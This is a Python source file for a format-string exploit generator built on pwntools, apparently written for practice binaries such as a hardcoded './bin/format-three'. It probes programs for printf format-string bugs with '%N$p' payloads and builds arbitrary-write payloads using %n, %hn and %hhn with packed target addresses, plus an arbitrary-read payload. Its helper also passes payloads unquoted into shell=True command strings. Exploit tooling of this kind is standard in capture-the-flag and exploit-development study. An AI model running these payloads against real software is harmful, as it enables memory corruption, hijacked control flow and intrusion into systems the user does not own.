#!/bin/env python3
import math
import subprocess
import sys

from rich import print as eprint
from loguru import logger
from pwn import p32, p64, pack


# Added code to help hexencode strings and bytes
def hexify(inp_bytes):
    inp_bytes = inp_bytes[::-1]
    out = ""
    if type(inp_bytes) == str:
        for x in inp_bytes:
            out += hex(ord(x))[2:]
    elif type(inp_bytes) == bytes:
        for x in inp_bytes:
            out += hex(x)[2:].rjust(2, "0")
    out = "0x" + out
    return out


def plain_print(inp):
    if type(inp) == str:
        inp = inp.encode(f"latin")
        sys.stdout.buffer.write(inp)
    elif type(inp) == bytes:
        sys.stdout.buffer.write(inp)


def sanitize_where(where):
    addr = []
    for x in where:
        if type(x) == int:
            addr.append(x)
        elif type(x) == str:
            try:
                addr.append(int(x, 16))
            except ValueError:
                print("ERROR: Input Format Error")
                exit()
        else:
            print("ERROR: Input Format Error")
            exit()
    return addr


# Helper function to interact with given binary
# using stdin, arguments & environment


def tbin(binary, pld, method="stdin"):
    if method == "stdin":
        res = subprocess.check_output(
            "python2 -c 'print " + '"' + pld + '"' + "'" + "|" + binary, shell=True
        )
    elif method == "args":
        res = subprocess.check_output(binary + " '" + pld + "'", shell=True)
    elif method == "env":
        res = subprocess.check_output(
            "python2 -c 'print " + '"' + pld + '"' + "'" + "| ./bin/format-three",
            shell=True,
        )
    return res


# Detects format string vuln when our input is reflected in output
# it returns the parameter of the printf where our input resides
def reflector(binary, attempts=100, method="stdin"):
    out = []
    for x in range(attempts):
        for padding in range(8):
            pld = "B" * padding + "A" * 8 + " %" + str(x) + "$p"
            res = tbin(binary, pld, method).decode("latin")
            if "4141414141414141" in res:
                out.append({"offset": x, "padding": padding})
    return out


# Todo : remove


def whr_pss(inp):
    HX = inp
    if type(inp) == str:
        HX = int(HX, 16)

    HX = hex(HX)[2:]

    HX_len = len(HX) // 2
    while HX_len % 4 != 0:
        HX = "00" + HX
        HX_len = len(HX) // 2

    for x in range(HX_len):
        arr = chr(int(HX[2 * x : 2 * (x + 1)], 16))
        # print()


# Format string design
# cprinter writer padding address


def cprinter(what):
    for x in range(len(what)):
        if x != 0:
            what[-x] = what[-x] - what[-x - 1]

    for x in range(len(what)):
        if what[x] < 10:
            what[x] = "B" * what[x]
        else:
            what[x] = "%" + str(what[x]) + "x"
    return what


def get_arg_shift(offset, ptr_size=8):
    # add appropriate number of "%c" to get to our param_offset
    arg_shift = "%c" * (offset - 1)
    added, scount = 0, 0
    while scount != math.ceil(len(arg_shift) / ptr_size):
        # loop to make sure we take into account the offset shift caused due to our addition of "%c"
        scount = math.ceil(len(arg_shift) / ptr_size)
        arg_shift += "%c" * (scount - added)
        added = scount

    c_len = (len(arg_shift) // 2) + (len(arg_shift) % ptr_size)
    arg_shift += " " * (ptr_size - (len(arg_shift) % ptr_size))

    return arg_shift, c_len


# The mystic function that house the magic of binary relm
def writer_no_dollar(c2print, steps, param_offset, ptr_size=8):

    # increment to acomodate the first fmt chunk needed argument
    param_offset += 1 if c2print[0].startswith("%") else 0

    pld = ""
    if steps == 4:
        bytes2write = ""
    elif steps == 2:
        bytes2write = "h"
    elif steps == 1:
        bytes2write = "hh"
    else:
        raise ValueError("unsupported steps size only [1,2,4] allowed")

    print(c2print)
    print(steps)
    print(param_offset)
    print(ptr_size)

    len_c2print = 0
    for x in c2print:
        len_c2print += len(x)

    expected_length = len_c2print + len(c2print) * (len(bytes2write) + 3)
    # print(expected_length)

    while True:
        next_param = param_offset
        pre_padding = ""
        post_padding = "O" * (ptr_size - (expected_length % ptr_size))
        expected_length += len(post_padding)

        # TODO: the prepad var below can be used to adjust the payload again if condition:
        # number of characters already printed in the write function (fmt_str_shift) variable
        # making the payload very accurate

        pre_padding, pre_pad_len = get_arg_shift(
            param_offset + expected_length // ptr_size, ptr_size=ptr_size
        )


        # TODO : more optimizations can be done and this bloick can be removed
        post_padding += "XXXXXXXX"
        expected_length += 8
        #######################################################################

        fmt = []
        for x in c2print:
            fmt.append(
                "%"
                # + str(next_param + expected_length // ptr_size)
                # + "$"
                + bytes2write
                + "n"
            )
            next_param += 1

        pld = ""
        for x in range(len(fmt)):
            pld = pld + c2print[x] + fmt[x]
        pld += post_padding

        if expected_length != len(pld):
            expected_length = len(pld) - len(post_padding)
        else:
            pld = pre_padding + pld
            # print(pld)
            return pld, pre_pad_len


# The mystic function that house the magic of binary relm
def writer(c2print, steps, param_offset, ptr_size=8):
    pld = ""
    if steps == 4:
        bytes2write = ""
    elif steps == 2:
        bytes2write = "h"
    elif steps == 1:
        bytes2write = "hh"
    else:
        raise ValueError("unsupported steps size only [1,2,4] allowed")

    len_c2print = 0
    for x in c2print:
        len_c2print += len(x)

    expected_length = len_c2print + len(c2print) * (
        len(bytes2write) + 3 + len(str(param_offset))
    )
    # print(expected_length)

    while True:
        next_param = param_offset
        post_padding = "O" * (ptr_size - (expected_length % ptr_size))
        expected_length += len(post_padding)

        fmt = []
        for x in c2print:
            fmt.append(
                "%"
                + str(next_param + expected_length // ptr_size)
                + "$"
                + bytes2write
                + "n"
            )
            next_param += 1

        pld = ""
        for x in range(len(fmt)):
            pld = pld + c2print[x] + fmt[x]
        pld += post_padding

        if expected_length != len(pld):
            expected_length = len(pld) - len(post_padding)
        else:
            # print(len(pld))
            # print(pld)
            return pld, 0


# takes care of size of given input and extra padding
# to clear off exxess bytes (residue from previous value)


def prep_bytes(what, steps, pad_data, fmt_str_shift):
    final = []
    split_bytes = []
    for p in range(len(what)):
        hx = what[p][2:]
        if steps > 1:
            if pad_data:
                while (len(hx) // 2) % 4 != 0:
                    hx = "00" + hx
        hx_len = len(hx) // 2

        split_byte = []
        for x in range(hx_len // steps):
            byte = (
                int("0x" + hx[2 * x * steps : 2 * (x + 1) * steps], 16) - fmt_str_shift
            )
            if byte < 0:
                logger.critical(
                    "byte got negative fmt string will not work properly consider increasing steps"
                )
            split_byte.append(byte)
        split_bytes.append(split_byte)
        final = sorted(final + split_byte)

    order = []
    for x in final:
        for split_byte in split_bytes:
            if x in split_byte:
                order.append((split_byte.index(x), split_bytes.index(split_byte)))
                split_byte[split_byte.index(x)] = "XX"

    return final, order


def write(
    content,
    param_offset,
    shift=0,
    fmt_str_shift=0,
    context="compact",
    platform="amd64",
    pad_data=True,
    no_dollars=False,
):
    """Format string generator

    Args:
        content (dict): dictionary of addr=>value matches
        param_offset (int): first offset which will reflect the input string eg (AAAABBBB%7$s) => AAAABBBB then 7 is the offset
        shift (int): If the input is not 8 bytes aligned eg if (XXXAAAABBBB%7$s) => AAAABBBB then 3 X are for alignment and shift is 3
        fmt_str_shift (int): if our fmt string will be concatenated with some other str before printing this is the index of start of our string in that string
        context (risky|compact|safe): write 4 bytes | 2 bytes | 1 byte per write operation  useful to set a balance between payload size and size of output printed by the printf
        platform (amd64|x86): platform
        pad_data (bool): whether to padd data or not ie if user requests to write 0x41 at some addr should we write 0x0041 instead to clear preceding byte as well

    Returns:
        format string
    """
    what = list(content.values())
    where = list(content.keys())
    addr = sanitize_where(where)
    if platform == "amd64":
        ptr_size = 8
        pack = p64
    elif platform == "i386":
        pack = p32
        ptr_size = 4
    else:
        raise ValueError("unsupported ptr_size use 4 or 8")

    for x in range(len(what)):
        try:
            int(what[x], 16)
        except ValueError:
            what[x] = hexify(what[x])

    if context == "safe":
        steps = 1
    elif context == "risky" or int(max(what), 16) < 0xFFFF:
        steps = 4  # 1, 2, 4
    else:
        steps = 2

    final, order = prep_bytes(what, steps, pad_data, fmt_str_shift)
    # print()
    # print()
    # print()
    # print()
    eprint(order)
    eprint(final)
    final = cprinter(final)
    eprint(final)
    # exit()
    if no_dollars:
        fmt, pre_pad_len = writer_no_dollar(final, steps, param_offset, ptr_size)
    else:
        fmt, pre_pad_len = writer(final, steps, param_offset, ptr_size)

    fmt += "S" * (shift % ptr_size)
    # print("=> " + fmt)
    fmt = fmt.encode("latin")

    # print("order: " + str(order))
    # print(final)
    # print("addr: " + str(addr))
    # print("\n\n")
    xn = 0x41
    for i in range(len(order)):
        x = order[i]
        marker = x[1]
        tmp = []
        for o in order:
            if o[1] == marker:
                tmp.append(o[0])
        max_splits = max(tmp)

        # print("i: " + str(i))
        # print("addr_index: " + str(marker))
        # print("x: " + str(x))
        # print("addr[addr_index]: " + hex(addr[marker] + steps * (max_splits-x[0])))
        # print("-------\n")

        if no_dollars and "x" in final[i]:
            fmt += pack(xn)
            xn += 1
        fmt += pack(addr[marker] + steps * (max_splits - x[0]))
        # fmt += b" " + hex(addr[marker] + steps * (max_splits - x[0])).encode()

    return fmt


def read_addr(addr, offset=7, padlength=0):
    """
    reads an address from a given binary
    """

    fmt = f"%{offset}$s"
    while len(fmt) > padlength:
        padlength += 8
        offset += 1
        fmt = f"%{offset}$s"

    padding = fmt
    while len(padding) < padlength:
        padding += "B"

    pld = padding.encode("latin") + pack(addr)
    return pld


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()

    parser.add_argument("-w", "--write", help="Write to some location")
    parser.add_argument("-v", "--value", help="What to write")
    parser.add_argument("-l", "--loc", help="Where to write")
    parser.add_argument("-o", "--offset", help="Parameter offset for reflected input")
    parser.add_argument(
        "-c", "--context", help="safe means stable, compact means small"
    )

    parser.add_argument("-b", "--binary", help="Location of binary")
    parser.add_argument("-i", "--method", help="Method to interact with binary")
    parser.add_argument("-a", "--attempts", help="Number of offsets to test")
    parser.add_argument("-p", "--preinput", help="input required to reach printf")

    args = parser.parse_args()

    if args.write:
        what = args.value.split(",")
        where = args.loc.split(",")
        content = dict(zip(where, what))
        if len(what) != len(where):
            print("Error: no of values do not match no of addresses")
            exit(2)

        pld = write(content, int(args.offset), args.context)
        # print(len(pld))
        plain_print(pld)
    elif args.binary:
        if args.attempts:
            attempts = int(args.attempts)
        else:
            attempts = 100
        print(reflector(args.binary, attempts, args.method))
